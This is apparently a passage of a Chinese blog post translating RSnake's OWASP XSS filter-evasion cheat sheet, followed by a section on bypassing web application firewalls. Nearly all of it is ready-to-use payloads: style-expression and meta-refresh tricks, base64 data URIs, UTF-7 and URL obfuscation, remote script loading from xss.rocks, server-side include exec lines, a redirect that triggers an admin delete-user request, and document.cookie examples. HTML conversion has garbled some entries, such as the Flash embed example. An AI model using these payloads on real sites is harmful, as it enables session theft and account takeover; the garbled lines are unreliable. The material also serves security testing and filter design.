<h2 id="利用style属性配合注释符来分解XSS-payload"><a href="#利用style属性配合注释符来分解XSS-payload" class="headerlink" title="利用style属性配合注释符来分解XSS payload"></a>利用<img>style属性配合注释符来分解XSS payload</h2><p>由Roman Ivanov创建.</p>
   <img style="xss:expr/*XSS*/ession(alert('XSS'))">   

<h2 id="利用标签进行分解XSS-payload-增强版"><a href="#利用标签进行分解XSS-payload-增强版" class="headerlink" title="利用标签进行分解XSS payload 增强版"></a>利用<style>标签进行分解XSS payload 增强版</h2><p>这与上述XSS payload混合,但他确实展现了<style>标签被分隔解析是多困难.同样它也会在IE下造成无限弹窗.</p>
<p>   exp/<em>&lt;A   STYLE=’no\xss:noxss(“</em>//<em>“);   xss:ex/</em>XSS<em>//</em>/*/pression(alert(“XSS”))’&gt;   </p>
<h2 id="利用标签-仅限于老版本Netscape"><a href="#利用标签-仅限于老版本Netscape" class="headerlink" title="利用标签(仅限于老版本Netscape)"></a>利用<STYLE>标签(仅限于老版本Netscape)</h2>   <STYLE   TYPE="text/javascript">alert(‘XSS’);</style>   

<h2 id="利用标签的background-image属性进行XSS"><a href="#利用标签的background-image属性进行XSS" class="headerlink" title="利用标签的background-image属性进行XSS"></a>利用<style>标签的background-image属性进行XSS</h2>   <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</style><a class="XSS"></a><br><br>## 利用<style>标签的background属性进行XSS<br><br>   <STYLE   type="text/css">BODY{background:url(“javascript:alert(‘XSS’)”)}</style>   

<h2 id="利用具有style属性的匿名的HTML标签进行XSS"><a href="#利用具有style属性的匿名的HTML标签进行XSS" class="headerlink" title="利用具有style属性的匿名的HTML标签进行XSS"></a>利用具有style属性的匿名的HTML标签进行XSS</h2><p>IE渲染引擎模式中IE6.0和Netscape8.1+并不关系你创建的html标签是否存在,只要它是以&lt;&gt;全开括号和字母开头就行;</p>
   <xss style="xss:expression(alert('XSS'))">   

<h2 id="利用本地HTC文件进行XSS"><a href="#利用本地HTC文件进行XSS" class="headerlink" title="利用本地HTC文件进行XSS"></a>利用本地HTC文件进行XSS</h2><p>这跟上述两个XSSpayload有点不同,因为它使用的.htc文件必须与XSS payload在同一域内.示例文件通过写入Javascript并利用style属性来运行;</p>
   <xss style="behavior:   url(xss.htc);">   

<h2 id="US-ASCII编码"><a href="#US-ASCII编码" class="headerlink" title="US-ASCII编码"></a>US-ASCII编码</h2><p>US-ASCII编码(由于Kurt Huwig发现).这里使用7位代替8位,该XSS payload可以绕过很多基于内容检测的过滤器,但仅限于主机上使用US-ASCII编码传输或者你设置为此编码时才起作用.这对于WEB应用防火墙XSS过滤比对服务器端过滤绕过更有用.已知Apache Tomcat目前唯一以US-ASCII编码传输的服务器.</p>
<p>   ¼script¾alert(¢XSS¢)¼/script¾   </p>
<h2 id="利用-lt-META-gt-标签进行XSS"><a href="#利用-lt-META-gt-标签进行XSS" class="headerlink" title="利用&lt; META &gt;标签进行XSS"></a>利用&lt; META &gt;标签进行XSS</h2><p>利用<meta>奇怪之处在于它不会在http头中发送引用referrer,因此它可以用用于某些类型攻击,你需要避免引入URL:</p>
   <meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">   

<h3 id="利用标签的content属性进行XSS"><a href="#利用标签的content属性进行XSS" class="headerlink" title="利用标签的content属性进行XSS"></a>利用<meta>标签的content属性进行XSS</h3><p>这种方案其实很不错,因为他没有任何明显的script或者Javascript指令,因为它使用base64编码.具体请参考<a href="https://tools.ietf.org/html/rfc2397" target="_blank" rel="noopener">RFC 2397</a>了解更多详情,或者访问此处<a href="http://ha.ckers.org/xsscalc.html" target="_blank" rel="noopener">XSS编码器</a>对你的XSSpaylod进行base64编码.</p>
   <meta http-equiv="refresh" content="0;url=data:text/html   base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">   

<h3 id="利用标签的带URL参数进行XSS绕过"><a href="#利用标签的带URL参数进行XSS绕过" class="headerlink" title="利用标签的带URL参数进行XSS绕过"></a>利用<meta>标签的带URL参数进行XSS绕过</h3><p>如果目标网站尝试检查URL是否包含http://,那么你可以使用以下payload来绕过它.( 由于Moritz Naumann提出);</p>
   <meta http-equiv="refresh" content="0; URL=http://;URL=javascript:alert('XSS');">   

<h2 id="利用标签进行XSS-3"><a href="#利用标签进行XSS-3" class="headerlink" title="利用标签进行XSS"></a>利用<iframe>标签进行XSS</iframe></h2><p>如果目标网站允许<iframe>,那么会产生很多XSS问题.</iframe></p>
   <iframe src="javascript:alert('XSS');"></iframe>   

<h2 id="利用事件触发标签的XSS"><a href="#利用事件触发标签的XSS" class="headerlink" title="利用事件触发标签的XSS"></a>利用事件触发<iframe>标签的XSS</iframe></h2><p>Iframes还有大多数其他元素可以使用像一下基于事件来进行混淆(由于David Cross提交.)</p>
   <iframe src="#" onmouseover="alert(document.cookie)"></iframe>   

<h2 id="利用进行XSS"><a href="#利用进行XSS" class="headerlink" title="利用进行XSS"></a>利用<frame>进行XSS</h2><p><frame>与<iframe>存在相同的问题.</iframe></p>
   <frameset><frame src="javascript:alert('XSS');"></frameset>   

<h2 id="利用标签进行XSS-4"><a href="#利用标签进行XSS-4" class="headerlink" title="利用标签进行XSS"></a>利用<table>标签进行XSS</table></h2>   <table background="javascript:alert('XSS')">   

<h3 id="利用标签进行XSS-5"><a href="#利用标签进行XSS-5" class="headerlink" title="利用标签进行XSS"></a>利用<td>标签进行XSS</td></h3><p>如图上面所述,<td>也容易受到包含Javascript的XSS payload攻击.</td></p>
<p>   <table><td background="javascript:alert('XSS')">   </td></table></p>
<h2 id="利用标签"><a href="#利用标签" class="headerlink" title="利用标签"></a>利用<div>标签</div></h2><h3 id="在DIV中使用background-image属性完成XSS"><a href="#在DIV中使用background-image属性完成XSS" class="headerlink" title="在DIV中使用background-image属性完成XSS"></a>在DIV中使用background-image属性完成XSS</h3>   <div style="background-image:   url(javascript:alert('XSS'))">   

<h3 id="使用background-image属性配合unicoded编码完成XSS"><a href="#使用background-image属性配合unicoded编码完成XSS" class="headerlink" title="使用background-image属性配合unicoded编码完成XSS"></a>使用background-image属性配合unicoded编码完成XSS</h3><p>这只是稍微修改去混淆下URL参数.它最早被Renaud Lifchitz发现用于攻击hotmaill;</p>
   <div style="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">   

<h3 id="使用background-image属性加上额外字符完成XSS"><a href="#使用background-image属性加上额外字符完成XSS" class="headerlink" title="使用background-image属性加上额外字符完成XSS"></a>使用background-image属性加上额外字符完成XSS</h3><p>Rnaske建立了一个快速的XSS Fuzzer来检测半开扩号后允许的字符,但在安全的站点模式下IE和Netscape8.1中Javascript命令之前.这些都是十进制的,但当然可以利用十六进制进行填充.(可以使用以下任意字符: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)</p>
   <div style="background-image:   url(&#1;javascript:alert('XSS'))">   

<h3 id="利用DIV表达式完成XSS"><a href="#利用DIV表达式完成XSS" class="headerlink" title="利用DIV表达式完成XSS"></a>利用DIV表达式完成XSS</h3><p>这个payload稍微修改下在冒号和” expression”中间加入一个换行符,可以非常有效绕过真实的XSS防护.</p>
   <div style="width:   expression(alert('XSS'));">   

<h2 id="利用IE注释块进行XSS绕过"><a href="#利用IE注释块进行XSS绕过" class="headerlink" title="利用IE注释块进行XSS绕过"></a>利用IE注释块进行XSS绕过</h2><p>尽在IE5.0及以上版本和使用IE渲染引擎模式的Netscape下有效.一些网站认为在注释内的内容是安全的,因此不需要移除.或者系统能够在页面某些部分添加注释标签，从而让它们失去有害性.如我们所知,这些操作(把内容注释掉的操作)可能是于事无补的:</p>
   <!--[if gte IE 4]>    <SCRIPT>alert('XSS');</SCRIPT>    <![endif]-->   
<h2 id="利用标签进行XSS-6"><a href="#利用标签进行XSS-6" class="headerlink" title="利用标签进行XSS"></a>利用<base>标签进行XSS</h2><p>这在IE和Netscape8.1的安全模式下能起作用.你需要使用//注释掉下一个字符,避免JavaScript错误,从而让我们的XSS攻击向量正常执行.这也依赖于一个条件:网站图像使用相对地址如”images/image.jpg”,而非绝对地址.如果地址中包含了斜杠(“/images/image.jpg”)，你可以在XSS payload移除一个:</p>
   <base href="javascript:alert('XSS');//">   

<h2 id="利用标签进行XSS-7"><a href="#利用标签进行XSS-7" class="headerlink" title="利用标签进行XSS"></a>利用<object>标签进行XSS</object></h2><p>如果页面允许<object>标签,你甚至可以在页面挂马.下面链接指向的文件是一个可以包含你的XSS payload的HTML文件;</object></p>
   <object type="text/x-scriptlet" data="http://xss.rocks/scriptlet.html"></object>   

<h2 id="使用标签嵌入一个包含XSS的Flash动画"><a href="#使用标签嵌入一个包含XSS的Flash动画" class="headerlink" title="使用标签嵌入一个包含XSS的Flash动画"></a>使用<embed>标签嵌入一个包含XSS的Flash动画</h2><p>如果你添加allowScriptAccess=“never”和allownetworking=”internal”属性,可以减轻这种风险(感谢Jonathan Vanasco提供信息);</p>
<p>   EMBED SRC=”<a href="http://ha.ckers.Using" target="_blank" rel="noopener">http://ha.ckers.Using</a> an   EMBED tag you can embed a Flash movie that contains XSS. Click here for a   demo. If you add the attributes allowScriptAccess=”never” and   allownetworking=”internal” it can mitigate this risk (thank you to   Jonathan Vanasco for the info).:   org/xss.swf”   AllowScriptAccess=”always”&gt;   </p>
<h2 id="你可以嵌入包含XSS-payload的SVG"><a href="#你可以嵌入包含XSS-payload的SVG" class="headerlink" title="你可以嵌入包含XSS payload的SVG"></a>你可以嵌入包含XSS payload的SVG</h2><p>这个例子只在Firefox下有效，但它比上面的攻击向量要好一些，因为这不需要用户安装或开启Flash（感谢nEUrOO提供）：</p>
   <embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH   A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv   MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw   IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh   TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always">   

<h2 id="使用ActionScript来混淆你的XSS-payload"><a href="#使用ActionScript来混淆你的XSS-payload" class="headerlink" title="使用ActionScript来混淆你的XSS payload"></a>使用ActionScript来混淆你的XSS payload</h2><p>   a=”get”;   b=”URL(\””;   c=”javascript:”;   d=”alert(‘XSS’);\”)”;   eval(a+b+c+d);   </p>
<h2 id="利用XML数据与CDATA区段混淆进行XSS"><a href="#利用XML数据与CDATA区段混淆进行XSS" class="headerlink" title="利用XML数据与CDATA区段混淆进行XSS"></a>利用XML数据与CDATA区段混淆进行XSS</h2><p>这个XSS payload仅限于IE和Netscape8.1中的IE渲染引擎中工作(由于Sec Consult在对yahoo进行审计时候发现这个payload)</p>
<p>   <xml id="xss"><i><b><img src="javas<!--   -->cript:alert('XSS')"></b></i></xml>   <span datasrc="#xss" datafld="B" dataformatas="HTML"></span>   </p>
<h2 id="利用XML的embedded方法在本地XML中嵌入Javascript"><a href="#利用XML的embedded方法在本地XML中嵌入Javascript" class="headerlink" title="利用XML的embedded方法在本地XML中嵌入Javascript"></a>利用XML的embedded方法在本地XML中嵌入Javascript</h2><p>这与上述相同,在本地托管(必须在同一台服务器上)包含你的XSS payload的XML文件.具体看示例;</p>
<p>   <xml src="xsstest.xml" id="I"></xml>   <span datasrc="#I" datafld="C" dataformatas="HTML"></span>   </p>
<h2 id="利用XML中加入HTML-Time元素完成XSS"><a href="#利用XML中加入HTML-Time元素完成XSS" class="headerlink" title="利用XML中加入HTML+Time元素完成XSS"></a>利用XML中加入HTML+Time元素完成XSS</h2><p>这就是Grey Magic攻击hotmail和yahoo!的方法,这仅限于IE和Netscape8.1中使用,并记住,需要在HTML和<body>标签之间使用;</body></p>
   <html><body>   &lt;?xml:namespace prefix=”t”   ns=”urn:schemas-microsoft-com:time”&gt;   &lt;?import namespace=”t”   implementation=”#default#time2”&gt;   &lt;t:set attributeName=”innerHTML”   to=”XSS<script defer>alert(“XSS”)</script>“&gt;   </body></html>   

<h2 id="通过简单修改字符去绕过过滤器对”-js”的过滤"><a href="#通过简单修改字符去绕过过滤器对”-js”的过滤" class="headerlink" title="通过简单修改字符去绕过过滤器对”.js”的过滤"></a>通过简单修改字符去绕过过滤器对”.js”的过滤</h2><p>可以将XSS payload的Javascript文件重命名为图片文件命名规则.</p>
   <script src="http://xss.rocks/xss.jpg"></script>   

<h2 id="SSI-服务端包含-进行XSS"><a href="#SSI-服务端包含-进行XSS" class="headerlink" title="SSI(服务端包含)进行XSS"></a>SSI(服务端包含)进行XSS</h2><p>这需要在服务器上安装SSI,这样才能使用这个XSS payload.可能不需要提及这一种攻击方法,如果攻击者可以在服务器上执行命令,那么这个安全问题就更严重了.</p>
   <!--#exec cmd="/bin/echo   '<SCR'"--><!--#exec cmd="/bin/echo 'IPT   SRC=http://xss.rocks/xss.js></SCRIPT>'"-->   
<h2 id="利用PHP完成XSS"><a href="#利用PHP完成XSS" class="headerlink" title="利用PHP完成XSS"></a>利用PHP完成XSS</h2><p>需要在服务器上安装php才能使用XSS payload.再次提醒下,如果你可以像这样远程运行任意脚本,那么可能有更多可怕的安全问题;</p>
<p>   &lt;? echo(‘&lt;SCR)’;   echo(‘IPT&gt;alert(“XSS”)‘);   ?&gt;   </p>
<h2 id="利用IMG标签嵌入命令执行XSS"><a href="#利用IMG标签嵌入命令执行XSS" class="headerlink" title="利用IMG标签嵌入命令执行XSS"></a>利用IMG标签嵌入命令执行XSS</h2><p>它是需要用户认证后才可以执行命令的当前域页面。它将可以用于创建或者删除用户（如果访问者是管理员），或是在其他地方发送凭证等等，虽然较少被使用,但非常有效的。</p>
<p>译者注:可以理解为类似CSRF那种操作.</p>
   <img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">   









<h3 id="利用IMG标签嵌入命令执行XSS-part-II"><a href="#利用IMG标签嵌入命令执行XSS-part-II" class="headerlink" title="利用IMG标签嵌入命令执行XSS part II"></a>利用IMG标签嵌入命令执行XSS part II</h3><p>这是一种更加可怕地攻击,因为没有看起来可以区别的标示符,而且它也不用放在被攻击者网站上.攻击向量使用302或304来跳转图片到一个命令地址.一个正常的<img src="httx://badguy.com/a.jpg">能够成为一个攻击工具,来执行相应的攻击命令.下面一个在Apache上的用来进行攻击的.htaccess文件的内容(感谢Timo提供)::</p>
<p>   Redirect 302 /a.jpg   <a href="http://victimsite.com/admin.asp&amp;deleteuser" target="_blank" rel="noopener">http://victimsite.com/admin.asp&amp;deleteuser</a>   </p>
<h2 id="Cookie篡改"><a href="#Cookie篡改" class="headerlink" title="Cookie篡改"></a>Cookie篡改</h2><p>我承认这是一种很隐蔽的攻击方式,但我曾经见过一些示例:页面允许<meta>标签,你可以用它来覆盖cookie.还有一些其他的示例:页面不是从数据库中取用户名,而是从cookie中读取.这两个场景相结合的情况下,你可以修改受害者的cookie,让你的XSS payload可以在页面上执行(同样你可以用它来改变用户状态，让它们以你的身份登录等):</p>
   <meta http-equiv="Set-Cookie" content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">   

<h2 id="利用UTF-7编码进行XSS"><a href="#利用UTF-7编码进行XSS" class="headerlink" title="利用UTF-7编码进行XSS"></a>利用UTF-7编码进行XSS</h2><p>如果页面存在XSS并且没有提供页面编码或者浏览器设置为UTF-7编码,页面就能遭到这种攻击（感谢Roman Ivanov）.在现代浏览器中,除非修改编码类型,否则这种攻击是不会产生的(Watchfire在google的404脚本中发现了这个漏洞)</p>
<p>   <head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="CONTENT-TYPE" content="text/html;   charset=UTF-7">   </head>+ADw-SCRIPT+AD4-alert(‘XSS’);+ADw-/SCRIPT+AD4-   </p>
<h2 id="使用HTML引用封装进行XSS"><a href="#使用HTML引用封装进行XSS" class="headerlink" title="使用HTML引用封装进行XSS"></a>使用HTML引用封装进行XSS</h2><p>这个在IE测试过,视情况而定.对于允许”<script>”标签,但不允许通过”&lt;SCRIPT SRC…”(正则表达式为:”/&lt;script[^&gt;]+src/I”),这种情况就可以考虑下此payload;</p>
   <SCRIPT a=">"   SRC="httx://xss.rocks/xss.js"></script>   

</p><p>对于允许”<script>”标签,但不允许”<script src …>”站点上执行XSS payload正则表达式为</p>
<p>” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”,(这个很重要,因为这种正则匹配很常见.)</p>
   <SCRIPT =">" SRC="httx://xss.rocks/xss.js"></script>   

</p><p>另外一个绕过类似这种正则过滤绕过,XSS payload.</p>
<p>(” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”)</p>
   <script a=">" '' src="httx://xss.rocks/xss.js"></script>   

<p>最后一种绕过这种正则过滤,XSS payload,使用重音符(它无法在firefox下使用).正则表达式为:</p>
<p>“/&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”;</p>
   <script a="`">`   SRC=”httx://xss.rocks/xss.js”&gt;</script>   

<p>这个XSS paylodad,会引起正则表达式不会匹配引号,同时发现会引起不正确的终止字符串.</p>
   <script a=">'>" src="httx://xss.rocks/xss.js"></script>   

<h3 id="一个令人担忧的XSS-payload"><a href="#一个令人担忧的XSS-payload" class="headerlink" title="一个令人担忧的XSS payload"></a>一个令人担忧的XSS payload</h3><p><strong>这种XSS payload让我很担忧,因为它几乎无法防御,除非禁用所有动态内容.</strong></p>
   <script>document.write(“&lt;SCRI”);</script>PT   SRC=”httx://xss.rocks/xss.js”&gt;   

<h2 id="URL字符串绕过"><a href="#URL字符串绕过" class="headerlink" title="URL字符串绕过"></a>URL字符串绕过</h2><p>假定页面不允许出现<a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com/</a>;</p>
<h3 id="利用IP代替域名"><a href="#利用IP代替域名" class="headerlink" title="利用IP代替域名"></a>利用IP代替域名</h3>   <a href="http://66.102.7.147/" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用URL编码"><a href="#利用URL编码" class="headerlink" title="利用URL编码"></a>利用URL编码</h3>   <a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用双字节编码"><a href="#利用双字节编码" class="headerlink" title="利用双字节编码"></a>利用双字节编码</h3><p>(注意:还有其他双字节编码方式,具体可以通过后面的IP混淆计算器来获取更多信息)</p>
   <a href="http://1113982867/" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用十六进制编码"><a href="#利用十六进制编码" class="headerlink" title="利用十六进制编码"></a>利用十六进制编码</h3><p>你可以在第2个数字看出来,每个数字允许的总大小在240之内.16进制的值是介于0~F之间的.从第3个数字看,前导0的也是不需要的:</p>
   <a href="http://0x42.0x0000066.0x7.0x93/" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用八进制编码"><a href="#利用八进制编码" class="headerlink" title="利用八进制编码"></a>利用八进制编码</h3><p>你可以填充0,但是要保证每个“数字”都不小于4个字符:</p>
   <a href="http://0102.0146.0007.00000223/" target="_blank" rel="noopener">XSS</a>   



<h3 id="利用混合编码"><a href="#利用混合编码" class="headerlink" title="利用混合编码"></a>利用混合编码</h3><p>我们混合并匹配基本编码,添加一些制表符和换行符.这些符号需要包含在引号内才起作用.</p>
   <a href="h   tt     p://6       6.000146.0x7.147/">XSS</a>   

<h3 id="利用协议解析绕过"><a href="#利用协议解析绕过" class="headerlink" title="利用协议解析绕过"></a>利用协议解析绕过</h3><p>(//转换为http://能节省一些字符).当空间成为问题时,这是非常方便的方法.也能绕过类似于”(ht|f)tp(s)?://“的正则(感谢Ozh的提供).你可以将”//“改为”\”.你需要保证斜杠在准确的位置,否则有可能被当成一个相对路径.</p>
   <a href="//www.google.com/">XSS</a>   

<h3 id="利用Google”手气不错”-part-1"><a href="#利用Google”手气不错”-part-1" class="headerlink" title="利用Google”手气不错” part 1"></a>利用Google”手气不错” part 1</h3><p>Firefox使用Google的手气不错功能来根据用户键入的关键字跳转到对应的网站.如果你的攻击页面在一些随机关键词的顶部,你可以使用这个特性来攻击Firefox用户.这利用了Firefox的“keyword:”协议.你可以通过使用若干关键词来达到目的:”keyword:XSS+RSnake”,这在Firefox2.0版本不再有效.</p>
   <a href="//google">XSS</a>   

<h3 id="利用Google”手气不错”-part-2"><a href="#利用Google”手气不错”-part-2" class="headerlink" title="利用Google”手气不错” part 2"></a>利用Google”手气不错” part 2</h3><p>这里使用了一个只有Firefox支持的小窍门.因为它是基于手气不错功能开发的.这个不支持opera，因为opera认为这是一个利用HTTP基本认证的网络钓鱼攻击.事实上它仅仅是一个畸形的URL.如果你单击这个链接的话,它就会产生作用.不过这个特性在Firefox2.0之后的版本也不支持了:</p>
   <a href="http://ha.ckers.org@google" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用Google”手气不错”-part-3"><a href="#利用Google”手气不错”-part-3" class="headerlink" title="利用Google”手气不错” part 3"></a>利用Google”手气不错” part 3</h3><p>这是一个畸形的Url,只能在Firefox和Opera中起作用.因为它们是基于手气不错功能实现的, 像上面的例子一样,它们需要你的网站在谷歌搜索中排名第一(例如google):</p>
   <a href="http://google:ha.ckers.org" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用删除cnames"><a href="#利用删除cnames" class="headerlink" title="利用删除cnames"></a>利用删除cnames</h3><p>结合上面的URL，移除www能节省4个字节：</p>
   <a href="http://google.com/" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用额外点绕过"><a href="#利用额外点绕过" class="headerlink" title="利用额外点绕过"></a>利用额外点绕过</h3>   <a href="http://www.google.com./" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用Javascript链接地址"><a href="#利用Javascript链接地址" class="headerlink" title="利用Javascript链接地址"></a>利用Javascript链接地址</h3>   <a href="javascript:document.location='http://www.google.com/'" target="_blank" rel="noopener">XSS</a>   

<h3 id="利用内容替换的payload"><a href="#利用内容替换的payload" class="headerlink" title="利用内容替换的payload"></a>利用内容替换的payload</h3><p>假定”<a href="http://www.google.com/“被过滤器以编程方式被替换为空.我会使用类似的攻击向量借用过滤器的转换来绕过XSS过滤器从而创建攻击向量.下面是一个帮助创建攻击向量的例子" target="_blank" rel="noopener">http://www.google.com/“被过滤器以编程方式被替换为空.我会使用类似的攻击向量借用过滤器的转换来绕过XSS过滤器从而创建攻击向量.下面是一个帮助创建攻击向量的例子</a>(IE: “java&#x09;script:”被转换为”java script:”,这在IE、安全模式下的Netscape 8.1+和Opera是有效的);</p>
   <a href="http://www.gohttp://www.google.com/ogle.com/" target="_blank" rel="noopener">XSS</a>   





































<h2 id="字符转义表"><a href="#字符转义表" class="headerlink" title="字符转义表"></a>字符转义表</h2><p>下面是&lt;字符在HTML和Javascript中所有组合.大多数不会被浏览器直接执行.但是在很多能够在上述某些特定情况下使用.</p>
<p>   &lt;    %3C   &amp;lt   &lt;   &amp;LT   &LT;   &amp;#60   &amp;#060   &amp;#0060   &amp;#00060   &amp;#000060   &amp;#0000060   &#60;   &#060;   &#0060;   &#00060;   &#000060;   &#0000060;   &amp;#x3c   &amp;#x03c   &amp;#x003c   &amp;#x0003c   &amp;#x00003c   &amp;#x000003c   &#x3c;   &#x03c;   &#x003c;   &#x0003c;   &#x00003c;   &#x000003c;   &amp;#X3c   &amp;#X03c   &amp;#X003c   &amp;#X0003c   &amp;#X00003c   &amp;#X000003c   &#X3c;   &#X03c;   &#X003c;   &#X0003c;   &#X00003c;   &#X000003c;   &amp;#x3C   &amp;#x03C   &amp;#x003C   &amp;#x0003C   &amp;#x00003C   &amp;#x000003C   &#x3C;   &#x03C;   &#x003C;   &#x0003C;   &#x00003C;   &#x000003C;   &amp;#X3C   &amp;#X03C   &amp;#X003C   &amp;#X0003C   &amp;#X00003C   &amp;#X000003C   &#X3C;   &#X03C;   &#X003C;   &#X0003C;   &#X00003C;   &#X000003C;   \x3c   \x3C   \u003c   \u003C   </p>
<h1 id="针对跨站脚本攻击-绕过WAF的方法"><a href="#针对跨站脚本攻击-绕过WAF的方法" class="headerlink" title="针对跨站脚本攻击-绕过WAF的方法"></a>针对跨站脚本攻击-绕过WAF的方法</h1><p>一般问题</p>
<p>l  存储型XSS</p>
<p>如果攻击者绕过过滤器发起XSS攻击,WAF将无法防御攻击</p>
<p>l  反射型XSS</p>
<p>   Example: <script> … setTimeout(\”writetitle()\”,$_GET[xss])   … </script>   Exploitation: /?xss=500);   alert(document.cookie);//   </p>
<p>基于DOM型XSS</p>
<p>   Example: <script> …   eval($_GET[xss]); … </script>   Exploitation: /?xss=document.cookie   </p>
<h2 id="XSS请求重定向"><a href="#XSS请求重定向" class="headerlink" title="XSS请求重定向"></a>XSS请求重定向</h2><p>容易受攻击代码:</p>
<p>   …    header(‘Refresh: 0; URL=’.$_GET[‘param’]);   …   </p>
<p>l  此请求WAF将会被拦截</p>
<p>   /?param=javascript:alert(document.cookie)   </p>
<p>l  利用编码将绕过WAF,并会在某些浏览器中执行XSS paylod.</p>
<p>   /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=   </p>
<h2 id="针对XSS-bypass-WAF的字符串"><a href="#针对XSS-bypass-WAF的字符串" class="headerlink" title="针对XSS bypass WAF的字符串"></a>针对XSS bypass WAF的字符串</h2><p>   <img src="x" onerror="javascript: window.onerror = alert; throw XSS">   <video> <source onerror="javascript: alert (XSS)">   <input value="XSS" type="text">   <applet code="javascript:confirm(document.cookie);">   <isindex x="javascript:" onmouseover="alert(XSS)">   “&gt;”&gt;’&gt;<script>alert(String.fromCharCode(88,83,83))</script>   “&gt;<img src="x:x" onerror="alert(XSS)">   “&gt;<iframe src="javascript:alert(XSS)">   <object data="javascript:alert(XSS)">   <isindex type="image" src="1" onerror="alert(XSS)">   <img src="x:alert(alt)" onerror="eval(src)" alt="0">   <img src="x:gif" onerror="window['al\u0065rt'](0)">   &lt;iframe/src=”data:text/html,<svg onload="alert(1)">“&gt;   <meta content="&NewLine; 1   &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>   <svg>&lt;script   xlink:href=data&colon;,window.open(‘<a href="https://www.google.com/&#39;)&gt;" target="_blank" rel="noopener">https://www.google.com/&#39;)&gt;</a>&lt;/script   <meta http-equiv="refresh" content="0;url=javascript:confirm(1)"/>   <iframe src="javascript&colon;alert&lpar;document&period;location&rpar;">   <form><a href="javascript:\u0061lert(1)" target="_blank" rel="noopener">X   &lt;img/<em>%00/src=”worksinchrome&colon;prompt(1)”/%00</em>/onerror=’eval(src)’&gt;   <style>//*{x:expression(alert(/xss/))}//<style></style>      On Mouse Over   &lt;img src=”/“ =_=”   title=”onerror=’prompt(1)’”&gt;   <a aa="" aaa="" aaaa="" aaaaa="" aaaaaa="" aaaaaaa="" aaaaaaaa="" aaaaaaaaa="" aaaaaaaaaa="" href="j&#97v&#97script:&#97lert(1)">ClickMe   <script x=""> alert(1) &lt;/script 1=2   <form><button   formaction=javascript&colon;alert(1)>CLICKME   &lt;input/onmouseover=”javaSCRIPT&colon;confirm&lpar;1&rpar;”   <iframe   src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>   </p>
<h2 id="利用混淆绕过过滤器"><a href="#利用混淆绕过过滤器" class="headerlink" title="利用混淆绕过过滤器"></a>利用混淆绕过过滤器</h2><p>   (alert)(1)   a=alert,a(1)   [1].find(alert)   top<a href="1">“al”+”ert”</a>   top<a href="1">/al/.source+/ert/.source</a>   al\u0065rt(1)   top<a href="1">‘al\145rt’</a>   top<a href="1">‘al\x65rt’</a>   top<a href="1">8680439..toString(30)</a>   </p>
<h1 id="作者和主编"><a href="#作者和主编" class="headerlink" title="作者和主编"></a>作者和主编</h1><p>Robert “RSnake” Hansen</p>
<h1 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h1><p>Adam Lange</p>
<p>Mishra Dhiraj其他备忘录</p>
<p>就不一样介绍了,详情请访问</p>
<p><a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series</a></p>
<hr>
<p><a href="#_ftnref1">[1]</a> XSS过滤绕过备忘单-<a href="http://cheatsheets.hackdig.com/?4.htm">http://cheatsheets.hackdig.com/?4.htm</a></p>
<p><a href="#_ftnref3">[3]</a> 不止有TAB,而且空格键也可以,并且可以利用两个空格来代替一个空格进行绕过测试.</p>
</script></a></a></form></iframe></svg></svg></object></iframe></applet></video></p></div></div></div></div></table></xss></xss></h2></h2></h2></bgsound></center>
    </article>
    <!-- license  -->
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2019/03/01/SQLMAP-tamper列表/" title= "sqlmap tamper 列表">
                    <div class="prevTitle">sqlmap tamper 列表</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

    <div id="lv-container" data-id="city" data-uid="MTAyMC80Mjg2Ni8xOTQxMw==">
        <script type="text/javascript">
            (function (d, s) {
                var j, e = d.getElementsByTagName(s)[0];
